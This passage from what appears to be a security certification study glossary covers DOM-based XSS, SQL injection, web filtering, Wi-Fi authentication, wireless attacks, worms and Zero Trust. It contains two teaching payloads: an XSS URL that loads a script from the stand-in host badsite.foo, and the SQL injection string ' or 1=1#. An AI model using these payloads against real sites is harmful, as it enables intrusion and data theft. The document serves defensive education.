A third type of XSS attack exploits vulnerabilities in client-side scripts. Such scripts often use the Document Object Model (DOM - When attackers send malicious scripts to a web app's client-side implementation of JavaScript to execute their attack solely on the client) to modify the content and layout of a web page. For example, the "document.write" method enables a page to take some user input and modify the page accordingly. An exploit against a client-side script could work as follows:

The attacker identifies an input validation vulnerability in the trusted site. For example, a message board might take the user's name from an input text box and show it in a header.
https://trusted.foo/messages?user=james

The attacker crafts a URL to modify the parameters of a script that the server will return, such as the following :
https://trusted.foo/messages?user=James%3Cscript%20src%3D%22https%3A%2F%2Fbadsite.foo%2Fhook.js%22%3E%3C%2Fscript%3E

The server returns a page with the legitimate DOM script embedded, but containing the parameter:
James<script src="https://badsite.foo/hook.js"></script>

The browser renders the page using the DOM script, adding the text "James" to the header, but also executing the hook.js script at the same time.
DOM-based cross-site scripting (XSS) occurs when a web application's client-side script manipulates the Document Object Model (DOM) of a webpage. Unlike other forms of XSS attacks that exploit server-side vulnerabilities, DOM-based XSS attacks target the client-side environment, allowing an attacker to inject malicious script code executed within the user's browser within the context of the targeted webpage.

2. SQL Injection (SQLi)
Where an overflow attack works against the way a process performs memory management, an injection attack exploits some unsecure way in which the application processes requests and queries. For example, an application might allow a user to view their profile with a database query that should return the single record for that one user's profile. An application vulnerable to an injection attack might allow a threat actor to return the records for all users, or to change fields in the record when they are only supposed to be able to read them.

A web application is likely to use Structured Query Language (SQL) to read and write information from a database. The main database operations are performed by SQL statements for selecting data (SELECT), inserting data (INSERT), deleting data (DELETE), and updating data (UPDATE). In a SQL injection (An attack that injects a database query into the input data directed at a server by accessing the client side of the application) attack, the threat actor modifies one or more of these four basic functions by adding code to some input accepted by the app, causing it to execute the attacker's own set of SQL queries or parameters. If successful, this could allow the attacker to extract or insert information into the database or execute arbitrary code on the remote system using the same privileges as the database application.

For example, consider a web form that is supposed to take a name as input. If the user enters "Bob," the application runs the following query:

SELECT * FROM tbl_user WHERE username = 'Bob'

If a threat actor enters the string ' or 1=1# and this input is not sanitized, the following malicious query will be executed:

SELECT * FROM tbl_user WHERE username = '' or 1=1#

The logical statement 1=1 is always true, and the # character turns the rest of the statement into a comment, making it more likely that the web application will parse this modified version and dump a list of all users.
Web Application Firewall (WAF) - A firewall designed specifically to protect software running on web servers and their back-end databases from code injection and DoS attacks.

A web application firewall (WAF) is designed to protect software running on web servers and their back-end databases from code injection and denial of service attacks. WAFs use application-aware processing rules to filter traffic and perform application-specific intrusion detection. The WAF can be programmed with signatures of known attacks and use pattern matching to block requests containing suspect code. The output from a WAF will be written to a log, which can reveal potential threats to the web application.

A WAF may be deployed as an appliance protecting the zone that the web server is placed in or as plug-in software for a web server platform.
Web Filtering - A software application or gateway that filters client requests for various types of Internet content (web, FTP, IM, and so on).

Web filtering is essential to cybersecurity operations, playing a pivotal role in safeguarding an organization's network. Its primary function is to block users from accessing malicious or inappropriate websites, thereby protecting the network from potential threats. Web filters analyze web traffic, often in real time, and can restrict access based on various criteria such as URL, IP address, content category, or even specific keywords.

One of the key benefits of web filtering is the prevention of malware, including ransomware and phishing attacks, which often originate from malicious websites. By restricting access to these sites, web filters significantly reduce the risk of malware infections. Web filtering can also increase employee productivity and limit legal liability by preventing access to inappropriate or non-work-related content. It plays a crucial role in data loss prevention (DLP) strategies by blocking certain types of data transfer or access to sites known for data leakage.

Agent-Based Filtering
Agent-based web filtering involves installing a software agent on desktop computers, laptops, and mobile devices. The agents enforce compliance with the organization's web filtering policies. Agents communicate with a centralized management server to retrieve filtering policies and rules and then apply them locally on the device. Agent-based solutions typically leverage cloud platforms to ensure they can communicate with devices regardless of the network they are connected to. This means filtering policies remain in effect even when users are off the corporate network, such as when working from home or traveling.

Agent-based filtering can also provide detailed reporting and analytics. The agent can log web access attempts and return this data to a management server for analysis allowing security analysts to monitor Internet usage patterns, identify attempts to access blocked content, and fine-tune the filtering rules as required. Because filtering occurs locally on the device, agent-based methods often provide more granular control, such as filtering HTTPS traffic or applying different filtering rules for different applications.

Centralized Web Filtering
A centralized proxy server plays a crucial role in web content filtering by acting as an intermediary between end users and the Internet. When an organization routes Internet traffic through a centralized proxy server, it can effectively control and monitor all inbound and outbound web content. The primary role of the proxy in web content filtering is to analyze web requests from users and determine whether to permit or deny access based on established policies. The proxy can block access to specific URLs, IP addresses, or categories of websites, such as social media platforms, gambling sites, or sites known for distributing malware.

Beyond blocking unwanted or harmful content, a centralized proxy server can also perform detailed logging and reporting of web activity to allow security analysts to track and analyze web usage patterns, identify policy violations, and gather valuable intelligence for refining filtering policies and rules. A centralized proxy server can provide additional security benefits, such as anonymizing requests and caching web content for improved performance.

A centralized proxy server employs various techniques to protect web traffic and ensure the safety of an organization's network, including the following:

1. URL Scanning - Where the proxy server examines the URLs requested by users. It can block access to specific URLs known to host malicious content, be inappropriate, or violate the company's Internet usage policy.

2. Content Categorization - Classifies websites into various categories, such as social networking, gambling, adult content, webmail, and many others. Organizations can define rules to allow or deny access based on these categories, providing a flexible way to enforce web usage policies.

3. Block Rules - Use the proxy server to implement block rules based on various factors such as the website's URL, domain, IP address, content category, or even specific keywords within the web content. For example, an organization could block all .exe downloads to prevent the accidental download of potentially harmful files.

4. Reputation-Based Filtering - Uses proxy servers to incorporate reputation-based filtering, which leverages continually updated databases that score websites based on their observed behavior and history. Sites known for hosting malware, engaging in phishing attacks, or distributing spam, for instance, would have a poor reputation score and could be automatically blocked.

Issues Related to Web Filtering
Content filtering is not without potential issues and challenges. One common problem is overblocking or underblocking. Overblocking occurs when the filter is too restrictive, inadvertently blocking access to legitimate and useful websites and negatively impacting employee productivity. Underblocking, on the other hand, occurs when the filter allows access to potentially harmful or inappropriate websites. Another issue is the handling of encrypted traffic (HTTPS). Without proper configuration, web filters may be unable to inspect encrypted traffic, representing most modern web traffic.

Decrypting and inspecting HTTPS traffic also introduces employee privacy issues and concerns. Privacy concerns can stem from logging and monitoring web activity. While these features are essential for security and policy enforcement, they must be managed carefully to protect user privacy and comply with relevant laws and regulations.
Web Server Logs - Web servers are typically configured to log HTTP traffic that encounters an error or traffic that matches some predefined rule set. This can preserve indicators of attempted and successful replay, forgery, and injection attacks.

The status code of a response can reveal quite a bit about both the request and the server's behavior. Codes in the 400 range indicate client-based errors, while codes in the 500 range indicate server-based errors. For example, repeated 403 ("Forbidden") responses may indicate that the server is rejecting a client's attempts to access resources they are not authorized to. A 502 ("Bad Gateway") response could indicate that communications between the target server and its upstream server are being blocked, or that the upstream server is down.

In addition to status codes, some web server software also logs HTTP header information for both requests and responses. This can provide a detailed picture of the makeup of each request or response, such as cookie information.
Whistleblower - A whistleblower is someone with an ethical motivation for releasing confidential information. While this could be classed as an internal threat in some respects, it is important to realize that whistleblowers making protected disclosures, such as reporting financial fraud through an authorized channel, cannot themselves be threatened or labeled in any way that seems retaliatory or punitive.
Wi-Fi Authentication Methods - In order to secure a network, you must confirm that only valid users are connecting to it. Wi-Fi authentication comes in three types: personal, open, and enterprise. Within the personal category, there are two methods: pre-shared key authentication (PSK) and simultaneous authentication of equals (SAE).

WPA2 Pre-Shared Key Authentication
In WPA2, pre-shared key (PSK - A wireless network authentication mode where a passphrase-based mechanism is used to allow group authentication to a wireless network. The passphrase is used to derive an encryption key) authentication uses a passphrase to generate the key used to encrypt communications. It is also referred to as group authentication because a group of users shares the same secret. When the access point is set to WPA2-PSK mode, the administrator configures a passphrase of between 8 and 63 ASCII characters. This is converted to a 256-bit hash-based message authentication code (HMAC), expressed as a 64-character hex value, using the PBKDF2 key stretching algorithm. This HMAC is referred to as the pairwise master key (PMK). The same secret must be configured on the access point and on each node that joins the network. The PMK is used as part of WPA2's 4-way handshake to derive various session keys.

All types of Wi-Fi personal authentication have been shown to be vulnerable to attacks that allow dictionary or brute force attacks against the passphrase. At a minimum, the passphrase must be at least 14 characters long to try to mitigate risks from cracking.

WPA3 Personal Authentication
While WPA3 still uses a passphrase to authenticate stations in personal mode, it changes the method the secret uses to agree to session keys. The scheme used is called a Password-Authenticated Key Exchange (PAKE). In WPA3, the Simultaneous Authentication of Equals (SAE) protocol replaces the WPA2 pre-shared key (PSK) method for creating the Pairwise Master Key (PMK). However, the 4-way handshake is still used for key exchange after the PMK is established. SAE uses the Dragonfly handshake, which is basically Diffie-Hellman over elliptic curves key agreement, combined with a hash value derived from the password and device MAC address to authenticate the nodes. With SAE, there should be no way for an attacker to sniff out the handshake to obtain the hash value and try to use an offline brute force or dictionary attack to recover the password. Dragonfly also implements ephemeral session keys providing forward secrecy.

The configuration interfaces for access points can use different labels for these methods. You might see WPA2-Personal and WPA3-SAE rather than WPA2-PSK and WPA3-Personal, for example. Additionally, an access point can be configured for WPA3 only or with support for legacy WPA2 (WPA3-Personal Transition mode). Researchers have found flaws in WPA3-Personal when it is configured in Transition Mode, which allows for downgrade attacks to WPA2. ( wi-fi.org/security-update-april-2019 ).

Advanced Authentication
Wireless enterprise authentication (A wireless network authentication mode where the access point acts as pass-through for credentials that are verified by an AAA server) modes, such as WPA2/WPA3-Enterprise, include several essential components designed to improve security for corporate wireless networks. One important element is 802.1x authentication, which provides a port-based network access control framework, ensuring that only authenticated devices are granted network access. Typically, 802.1x requires an authentication server such as RADIUS (Remote Authentication Dial-In User Service), which verifies the credentials of users or devices trying to connect to the network.

In enterprise mode authentication schemes, users have a unique set of credentials rather than a shared passphrase as used in WPA2/WPA3 personal mode. Requiring each user or device to authenticate using unique credentials allows network administrators to track network usage at a granular level. The protocol also supports multiple Extensible Authentication Protocol (EAP) types, such as EAP-TLS, EAP-TTLS, or PEAP, which define specific authentication methods. EAP-TLS, for instance, uses client-server certificates for mutual authentication, while EAP-TTLS and PEAP utilize a server-side certificate. The server-side certificate is used to establish a secure tunnel for transmitting user credentials and helps devices validate the legitimacy of the access point. Enterprise mode authentication includes dynamic encryption key management, automatically changing the encryption keys used during a user's session.

Remote Authentication Dial-In User Service (RADIUS)
The Remote Authentication Dial-In User Service (RADIUS) standard is published as an Internet standard. There are several RADIUS server and client products.

The NAS device (Network Access Server) is configured with the IP address of the RADIUS server and with a shared secret. This allows the client to authenticate to the server. Remember that the client is the access device (switch, access point, or VPN gateway), not the user's PC or laptop. A generic RADIUS authentication workflow proceeds as follows:

1. The user's device (the supplicant) makes a connection to the NAS appliance, such as an access point, switch, or remote access server.

2. The NAS prompts the user for their authentication credentials. RADIUS supports PAP, CHAP, and EAP. Most implementations now use EAP, as PAP and CHAP are not secure. If EAP credentials are required, the NAS enables the supplicant to transmit EAP over LAN (EAPoL - A port-based network access control (PNAC) mechanism that allows the use of EAP authentication when a host connects to an Ethernet switch) data, but not any other type of network traffic.

3. The supplicant submits the credentials as EAPoL data. The RADIUS client uses this information to create an Access-Request RADIUS packet, encrypted using the shared secret. It sends the Access-Request to the Authentication, Authorization, and 

4. Accounting (AAA) server using UDP on port 1812 (by default).
The AAA server decrypts the Access-Request using the shared secret. If the Access-Request cannot be decrypted (because the shared secret is not correctly configured, for instance), the server does not respond.

5. With EAP, there will be an exchange of Access-Challenge and Access-Request packets as the authentication method is set up and the credentials verified. The NAS acts as a pass-thru, taking RADIUS messages from the server, and encapsulating them as EAPoL to transmit to the supplicant.

6. At the end of this exchange, if the supplicant is authenticated, the AAA server responds with an Access-Accept packet; otherwise, an Access-Reject packet is returned.

Optionally, the NAS can use RADIUS for accounting (logging). Accounting uses port 1813. The accounting server can be different from the authentication server.
Wi-Fi Protected Access (WPA) - Standards for authenticating and encrypting access to Wi-Fi networks.
Wi-Fi Protected Access 3 (WPA3) - Neither WEP nor the original WPA version is considered secure enough for continued use. WPA2 uses the Advanced Encryption Standard (AES), deployed within the Counter Mode with Cipher Block Chaining Message Authentication Code Protocol (CCM). AES replaces RC4 and CCM replaces TKIP. CCM provides authenticated encryption, which is designed to make replay attacks harder.

Weaknesses found in WPA2 led to its intended replacement by WPA3. The main features of WPA3 are as follows:

1. Simultaneous Authentication of Equals (SAE - Personal authentication mechanism for Wi-Fi networks introduced with WPA3 to address vulnerabilities in the WPA-PSK method) - Replaces the Pre-Shared Key (PSK) exchange protocol in WPA2, ensuring an attacker cannot intercept the Wi-Fi password even when capturing data from a successful login.

2. Enhanced Open - Encrypts traffic between devices and the access point, even without a password, which increases privacy and security on open networks.

3. Updated Cryptographic Protocols - Replaces AES CCM with the AES Galois Counter Mode (GCM - A high performance mode of operation for symmetric encryption. Provides a special characteristic called authenticated encryption with associated data, or AEAD) mode of operation. Galois Counter Mode has higher levels of performance than CCM.

4. Wi-Fi Easy Connect - Allows connecting devices by scanning a QR code, reducing the need for complicated configurations while maintaining secure connections.

Wi-Fi performance also depends on device support for the latest 802.11 standards. The most recent generation (802.11ax) is being marketed as Wi-Fi 6. The earlier standards are retroactively named Wi-Fi 5 (802.11ac) and Wi-Fi 4 (802.11n). The performance standards are developed in parallel with the WPA security specifications. Most Wi-Fi 6 devices and some Wi-Fi 5 and Wi-Fi 4 products should support WPA3 either natively or with a firmware/driver update.
Wi-Fi Protected Setup (WPS) - A feature of WPA and WPA2 that allows enrollment in a wireless network based on an eight-digit PIN.

As setting up an access point securely is relatively complex for residential consumers, vendors have developed a system to automate the process called Wi-Fi Protected Setup (WPS). To use WPS, both the access point and wireless station (client device) must be WPS-capable. Typically, the devices will have a push button. Activating this on the access point and the adapter simultaneously will associate the devices using a PIN, then associate the adapter with the access point using WPA2. The system generates a random SSID and PSK. If the devices do not support the push button method, the PIN (printed on the WAP) can be entered manually.

Unfortunately, WPS is vulnerable to a brute force attack. While the PIN is eight characters, one digit is a checksum and the rest are verified as two separate PINs of four and three characters. These separate PINs are many orders of magnitude simpler to brute force, typically requiring just hours to crack. On some models, disabling WPS through the admin interface does not actually disable the protocol, or there is no option to disable it. Some APs can lock out an intruder if a brute force attack is detected, but in some cases, the attack can just be resumed when the lockout period expires.

To counter this, the lockout period can be increased. However, this can leave APs vulnerable to a denial of service (DoS) attack. When provisioning a WAP, it is essential to verify what steps the manufacturer has taken to make their WPS implementation secure and to use the required device firmware level identified as secure.

The Easy Connect method, announced alongside WPA3, is intended to replace WPS as a method of securely configuring client devices with the information required to access a Wi-Fi network. Easy Connect is a brand name for the Device Provisioning Protocol (DPP).

Each participating device must be configured with a public/private key pair. Easy Connect uses quick response (QR) codes or near-field communication (NFC) tags to communicate each device's public key. A smartphone is registered as an Easy Connect configurator app and associated with the WAP using its QR code. Each client device can then be associated by scanning its QR code or NFC tag in the configurator app. As well as fixing the security problems associated with WPS, this is a straightforward means of configuring headless Internet of Things (IoT) devices with Wi-Fi connectivity.
WiFi Heat Map - In a Wi-Fi site survey, a diagram showing signal strength and channel utilization at different locations.

Example heatmap of an office space with four access points. Colors are used to show signal strength from the access points with the following color scheme: blue shows strong signal strength, green shows good signal strength, yellow shows okay signal strength, and red shows low or no signal strength. Signal strength is affected by distance from the access point and obstructions like metal and stone walls or metal enclosures such as elevators.
Wildcard Domain - In PKI, a digital certificate that will match multiple subdomains of a parent domain.

A wildcard domain, such as *.comptia.org , means that the certificate issued to the parent domain will be accepted as valid for all subdomains (to a single level).
Windows Authentication - Windows authentication involves a complex architecture of components, but the following three scenarios are typical:

1. Windows local sign-in - is the Local Security Authority Subsystem Service (LSASS) that compares the submitted credential to a hash stored in the Security Accounts Manager (SAM) database, which is part of the registry. This is also referred to as interactive logon.

2. Windows network sign-in - is LSASS which can pass the credentials for authentication to an Active Directory (AD) domain controller. The preferred system for network authentication is based on Kerberos, but legacy network applications might use NT LAN Manager (NTLM) authentication.

3. Remote sign-in - is used if the user's device is not directly connected to the local network, authentication can take place over a virtual private network (VPN), enterprise Wi-Fi, or web portal. These use protocols to create a secure connection between the client machine, the remote access device, and the authentication server.
Windows Logs - The three main Windows event log files are the following:

1. Application - Events generated by application processes, such as when there is a crash, or when an app is installed or removed.

2. Security - Audit events, such as a failed login or access to a file being denied.

3. System - Events generated by the operating system's kernel processes and services, such as when a service or driver cannot start, when a service's startup type is changed, or when the computer shuts down.
Wired Equivalent Privacy (WEP) - A legacy mechanism for encrypting data sent over a wireless connection.
Wired Network (Network Vector) - A threat actor with access to the site attaches an unauthorized device to a physical network port, and the device is permitted to communicate with other hosts. This potentially allows the threat actor to launch eavesdropping, on-path, and DoS attacks.
Wireless Attacks - Wireless networks present particular security challenges and are frequently the vector for various types of attacks.

Rogue Access Points
A rogue access point is one that has been installed on the network without authorization, whether with malicious intent or not. A malicious user can set up such an access point with something as basic as a smartphone with tethering capabilities, and a non-malicious user could enable such an access point by accident. If connected to a local segment, an unauthorized access point creates a backdoor through which to attack the network.

A rogue access point masquerading as a legitimate one is called an evil twin. Each network is identified to users by a service set identifier (SSID) name. An evil twin (A wireless access point that deceives users into believing that it is a legitimate network access point) might use typosquatting or SSID stripping to make the rogue network name appear similar to the legitimate one. Alternatively, the attacker might use some DoS technique to overcome the legitimate access point. In the latter case, they could spoof both the SSID and the basic SSID (BSSID). The BSSID is the MAC address of the access point's radio. The evil twin might be able to harvest authentication information from users entering their credentials by mistake and implement a variety of other on-path attacks, including DNS redirection.

A rogue hardware access point can be identified through physical inspections. There are also various Wi-Fi analyzers and wireless intrusion protection systems that can detect rogue access points. These can log use of typosquatting SSIDs and unknown and duplicate (spoofed) MAC addresses. In an enterprise network, access points are usually connected to switches. Monitoring can detect any that are not and flag them as potential rogues. They may also be able to identify radio hardware and alert if an unauthorized access point brand is detected.

Wireless Denial of Service
A wireless denial of service (DoS) attack is usually designed to prevent clients from connecting to the legitimate access point. A wireless network can be disrupted by interference from other radio sources. These are often unintentional, but it is also possible for an attacker to purposefully jam the legitimate network by setting up a rogue access point with a stronger signal.

Wireless DoS can also target clients. In the normal course of operations, an access point and client use management frames to control connections. A disassociation attack (Spoofing frames to disconnect a wireless station to try to obtain authentication data to crack) exploits the lack of encryption in management frame traffic to send spoofed frames. One type of disassociation attack injects management frames that spoof the MAC address of a single victim station in a disassociation notification, causing it to be disconnected from the network. Another variant of the attack broadcasts spoofed frames to disconnect all stations. As well as trying to redirect connections to an evil twin, a disassociation attack might also be used in conjunction with a replay attack aimed at recovering the network key.

Wireless Replay and Key Recovery
Wireless authentication is vulnerable to various types of replay attacks that aim to capture the hashes used when a wireless station associates with an access point. Once the hash is captured, it can be subjected to offline brute force and dictionary cracking. A KRACK attack uses a replay mechanism that targets the WPA and WPA2 4-way handshake. KRACK is effective regardless of whether the authentication mechanism is personal or enterprise. It is important to ensure both clients and access points are fully patched against such attacks.
Wireless Denial of Service (DoS) Attack - A wireless denial of service (DoS) attack is usually designed to prevent clients from connecting to the legitimate access point. A wireless network can be disrupted by interference from other radio sources. These are often unintentional, but it is also possible for an attacker to purposefully jam the legitimate network by setting up a rogue access point with a stronger signal.

Wireless DoS can also target clients. In the normal course of operations, an access point and client use management frames to control connections. A disassociation attack (Spoofing frames to disconnect a wireless station to try to obtain authentication data to crack) exploits the lack of encryption in management frame traffic to send spoofed frames. One type of disassociation attack injects management frames that spoof the MAC address of a single victim station in a disassociation notification, causing it to be disconnected from the network. Another variant of the attack broadcasts spoofed frames to disconnect all stations. As well as trying to redirect connections to an evil twin, a disassociation attack might also be used in conjunction with a replay attack aimed at recovering the network key.
Wireless Encryption - As well as the site design, a wireless network must be configured with security settings. Without encryption, anyone within range can intercept and read packets passing over the wireless network. Security choices are determined by device support for the various Wi-Fi security standards, by the type of authentication infrastructure, and by the purpose of the WLAN. Security standards determine which cryptographic protocols are supported, the means of generating the encryption key, and the available methods for authenticating wireless stations when they try to join (or associate with) the network.

The first version of Wi-Fi Protected Access (WPA - Standards for authenticating and encrypting access to Wi-Fi networks) was designed to fix critical vulnerabilities in the earlier wired equivalent privacy (WEP - A legacy mechanism for encrypting data sent over a wireless connection) standard. Like WEP, version 1 of WPA uses the RC4 stream cipher but adds a mechanism called the Temporal Key Integrity Protocol (TKIP - The mechanism used in the first version of WPA to improve the security of wireless encryption mechanisms, compared to the flawed WEP standard) to make it stronger.

Wi-Fi Protected Setup (WPS)
As setting up an access point securely is relatively complex for residential consumers, vendors have developed a system to automate the process called Wi-Fi Protected Setup (WPS - A feature of WPA and WPA2 that allows enrollment in a wireless network based on an eight-digit PIN). To use WPS, both the access point and wireless station (client device) must be WPS-capable. Typically, the devices will have a push button. Activating this on the access point and the adapter simultaneously will associate the devices using a PIN, then associate the adapter with the access point using WPA2. The system generates a random SSID and PSK. If the devices do not support the push button method, the PIN (printed on the WAP) can be entered manually.

Unfortunately, WPS is vulnerable to a brute force attack. While the PIN is eight characters, one digit is a checksum and the rest are verified as two separate PINs of four and three characters. These separate PINs are many orders of magnitude simpler to brute force, typically requiring just hours to crack. On some models, disabling WPS through the admin interface does not actually disable the protocol, or there is no option to disable it. Some APs can lock out an intruder if a brute force attack is detected, but in some cases, the attack can just be resumed when the lockout period expires.

To counter this, the lockout period can be increased. However, this can leave APs vulnerable to a denial of service (DoS) attack. When provisioning a WAP, it is essential to verify what steps the manufacturer has taken to make their WPS implementation secure and to use the required device firmware level identified as secure.

The Easy Connect method, announced alongside WPA3, is intended to replace WPS as a method of securely configuring client devices with the information required to access a Wi-Fi network. Easy Connect is a brand name for the Device Provisioning Protocol (DPP).

Each participating device must be configured with a public/private key pair. Easy Connect uses quick response (QR) codes or near-field communication (NFC) tags to communicate each device's public key. A smartphone is registered as an Easy Connect configurator app and associated with the WAP using its QR code. Each client device can then be associated by scanning its QR code or NFC tag in the configurator app. As well as fixing the security problems associated with WPS, this is a straightforward means of configuring headless Internet of Things (IoT) devices with Wi-Fi connectivity.

Wi-Fi Protected Access 3 (WPA3)
Neither WEP nor the original WPA version is considered secure enough for continued use. WPA2 uses the Advanced Encryption Standard (AES), deployed within the Counter Mode with Cipher Block Chaining Message Authentication Code Protocol (CCM). AES replaces RC4 and CCM replaces TKIP. CCM provides authenticated encryption, which is designed to make replay attacks harder.

Weaknesses found in WPA2 led to its intended replacement by WPA3. The main features of WPA3 are as follows:

1. Simultaneous Authentication of Equals (SAE - Personal authentication mechanism for Wi-Fi networks introduced with WPA3 to address vulnerabilities in the WPA-PSK method) - Replaces the Pre-Shared Key (PSK) exchange protocol in WPA2, ensuring an attacker cannot intercept the Wi-Fi password even when capturing data from a successful login.

2. Enhanced Open - Encrypts traffic between devices and the access point, even without a password, which increases privacy and security on open networks.

3. Updated Cryptographic Protocols - Replaces AES CCM with the AES Galois Counter Mode (GCM - A high performance mode of operation for symmetric encryption. Provides a special characteristic called authenticated encryption with associated data, or AEAD) mode of operation. Galois Counter Mode has higher levels of performance than CCM.

4. Wi-Fi Easy Connect - Allows connecting devices by scanning a QR code, reducing the need for complicated configurations while maintaining secure connections.

Wi-Fi performance also depends on device support for the latest 802.11 standards. The most recent generation (802.11ax) is being marketed as Wi-Fi 6. The earlier standards are retroactively named Wi-Fi 5 (802.11ac) and Wi-Fi 4 (802.11n). The performance standards are developed in parallel with the WPA security specifications. Most Wi-Fi 6 devices and some Wi-Fi 5 and Wi-Fi 4 products should support WPA3 either natively or with a firmware/driver update.
Wireless Network Installation Considerations - Wireless network installation considerations refer to the factors that ensure good availability of authorized Wi-Fi access points. A network with patchy coverage is vulnerable to rogue and evil twin attacks.

The 5 GHz band has more space to configure nonoverlapping channels. Also note that a WAP can use bonded channels to improve bandwidth, but this increases risks from interference.

Wireless Access Point (WAP) Placement
An infrastructure-based wireless network comprises one or more wireless access points, each connected to a wired network. The access points (A device that provides a connection between wireless devices and can connect to wired networks, implementing an infrastructure mode WLAN) forward traffic to and from the wired switched network. Each WAP is identified by its MAC address, also referred to as its basic service set identifier (BSSID). Each wireless network is identified by its name or service set identifier (SSID - A character string that identifies a particular wireless LAN).

Wireless networks can operate in either the 2.4 GHz or 5 GHz radio band. Each radio band is divided into a number of channels, and each WAP must be configured to use a specific channel. For performance reasons, the channels chosen should be as widely spaced as possible to reduce interference.

Site Surveys and Heat Maps
The coverage and interference factors mean that WAPs must be positioned and configured to cover the whole area with the least overlap as possible. A site survey (Documentation about a location for the purposes of building an ideal wireless infrastructure; it often contains optimum locations for wireless antenna and access point placement to provide the required coverage for clients and identify sources of interference) is used to measure signal strength and channel usage throughout the area to cover. A site survey starts with an architectural map of the site, with features that can cause background interference marked. These features include solid walls, reflective surfaces, motors, microwave ovens, and so on. A Wi-Fi-enabled laptop or mobile device with Wi-Fi analyzer software installed performs the survey. The Wi-Fi analyzer records information about the signal obtained at regularly spaced points as the surveyor moves around the area.

These readings are combined and analyzed to produce a heat map (In a Wi-Fi site survey, a diagram showing signal strength and channel utilization at different locations), showing where a signal is strong (green/blue) or weak (red), and which channel is being used and how they overlap. This data is then used to optimize the design by adjusting transmit power to reduce a WAP's range, changing the channel on a WAP, adding a new WAP, or physically moving a WAP to a new location.

Example heatmap of an office space with four access points. Colors are used to show signal strength from the access points with the following color scheme: blue shows strong signal strength, green shows good signal strength, yellow shows okay signal strength, and red shows low or no signal strength. Signal strength is affected by distance from the access point and obstructions like metal and stone walls or metal enclosures such as elevators.
Wireless Replay and Key Recovery Attack - Wireless authentication is vulnerable to various types of replay attacks that aim to capture the hashes used when a wireless station associates with an access point. Once the hash is captured, it can be subjected to offline brute force and dictionary cracking. A KRACK attack uses a replay mechanism that targets the WPA and WPA2 4-way handshake. KRACK is effective regardless of whether the authentication mechanism is personal or enterprise. It is important to ensure both clients and access points are fully patched against such attacks.
Work Recovery Time (WRT) - In disaster recovery, time additional to the RTO of individual systems to perform reintegration and testing of a restored or upgraded system following an event.

Following systems recovery, there may be additional work to reintegrate different systems, test overall functionality, and brief system users on any changes or different working practices so that the business function is again fully supported.

RTO + WRT must not exceed MTD!
Workforce Multiplier - A tool or automation that increases employee productivity, enabling them to perform more tasks to the same standard per unit of time.
Worm - A type of malware that replicates between processes in system memory and can spread over client/server network connections.

A computer worm is memory-resident malware that can run without user intervention and replicate over network resources. A virus is executed only when the user performs an action such as downloading and running an infected executable process, attaching an infected USB stick, or opening an infected document with macros or scripting enabled. By contrast, a worm can execute by exploiting a vulnerability in a process when the user browses a website, runs a vulnerable server application, or is connected to an infected file share. For example, the Code Red worm was able to infect early versions of Microsoft's IIS web server software via a buffer overflow vulnerability. It then scanned randomly generated IP ranges to try to infect other vulnerable IIS servers.

The primary effect of the first types of computer worm is to rapidly consume network bandwidth as the worm replicates. A worm may also be able to crash an operating system or server application, performing a denial of service attack. Also, like viruses, worms can carry a payload that can be written to perform any type of malicious action.

The Conficker worm illustrated the potential for remote code execution and memory-resident malware to effect highly potent attacks. As malware has continued to be developed for criminal intent and security software became better able to detect and block static threats, malware code and techniques have become more sophisticated.
WPA2 Pre-Shared Key Authentication - In WPA2, pre-shared key (PSK - A wireless network authentication mode where a passphrase-based mechanism is used to allow group authentication to a wireless network. The passphrase is used to derive an encryption key) authentication uses a passphrase to generate the key used to encrypt communications. It is also referred to as group authentication because a group of users shares the same secret. When the access point is set to WPA2-PSK mode, the administrator configures a passphrase of between 8 and 63 ASCII characters. This is converted to a 256-bit hash-based message authentication code (HMAC), expressed as a 64-character hex value, using the PBKDF2 key stretching algorithm. This HMAC is referred to as the pairwise master key (PMK). The same secret must be configured on the access point and on each node that joins the network. The PMK is used as part of WPA2's 4-way handshake to derive various session keys.

All types of Wi-Fi personal authentication have been shown to be vulnerable to attacks that allow dictionary or brute force attacks against the passphrase. At a minimum, the passphrase must be at least 14 characters long to try to mitigate risks from cracking.
WPA3 Personal Authentication - While WPA3 still uses a passphrase to authenticate stations in personal mode, it changes the method the secret uses to agree to session keys. The scheme used is called a Password-Authenticated Key Exchange (PAKE). In WPA3, the Simultaneous Authentication of Equals (SAE) protocol replaces the WPA2 pre-shared key (PSK) method for creating the Pairwise Master Key (PMK). However, the 4-way handshake is still used for key exchange after the PMK is established. SAE uses the Dragonfly handshake, which is basically Diffie-Hellman over elliptic curves key agreement, combined with a hash value derived from the password and device MAC address to authenticate the nodes. With SAE, there should be no way for an attacker to sniff out the handshake to obtain the hash value and try to use an offline brute force or dictionary attack to recover the password. Dragonfly also implements ephemeral session keys providing forward secrecy.

The configuration interfaces for access points can use different labels for these methods. You might see WPA2-Personal and WPA3-SAE rather than WPA2-PSK and WPA3-Personal, for example. Additionally, an access point can be configured for WPA3 only or with support for legacy WPA2 (WPA3-Personal Transition mode). Researchers have found flaws in WPA3-Personal when it is configured in Transition Mode, which allows for downgrade attacks to WPA2. ( wi-fi.org/security-update-april-2019 ).
Zero Standing Privileges (ZSP) - Permissions must be explicitly requested and are only granted for a limited period.
Zero Trust Architecture (ZTA) - The security design paradigm where any request (host-to-host or container-to-container) must be authenticated before being allowed.

Organizations' increased dependence on information technology has driven requirements for services to be always on, always available, and accessible from anywhere. Cloud platforms have become an essential component of technology infrastructures, driving broad software and system dependencies and widespread platform integration. The distinction between inside and outside is gone. For an organization leveraging remote workforces, running a mix of on-premises and public cloud infrastructure, and using outsourced services and contractors, the opportunity for breach is very high. Staff and employees are using computers attached to home networks, or worse, unsecured public Wi-Fi. Critical systems are accessible through various external interfaces and run software developed by outsourced, contracted external entities. In addition, many organizations design their environments to accommodate Bring Your Own Device (BYOD.)

As these trends continue, implementing Zero Trust architectures will become more critical. Zero Trust architectures assume that nothing should be taken for granted and that all network access must be continuously verified and authorized. Any user, device, or application seeking access must be authenticated and verified. Zero Trust differs from traditional security models based on simply granting access to all users, devices, and applications contained within an organization's trusted network.

NIST SP 800-207 "Zero Trust Architecture" defines Zero Trust as "cybersecurity paradigms that move defenses from static, network-based perimeters to focus on users, assets, and resources." A Zero Trust architecture can protect data, applications, networks, and systems from malicious attacks and unauthorized access more effectively than a traditional architecture by ensuring that only necessary services are allowed and only from appropriate sources. Zero Trust enables organizations to offer services based on varying levels of trust, such as providing more limited access to sensitive data and systems.

The Key Benefits of a Zero Trust Architecture

1. Greater security - Requires all users, devices, and applications to be authenticated and verified before network access.

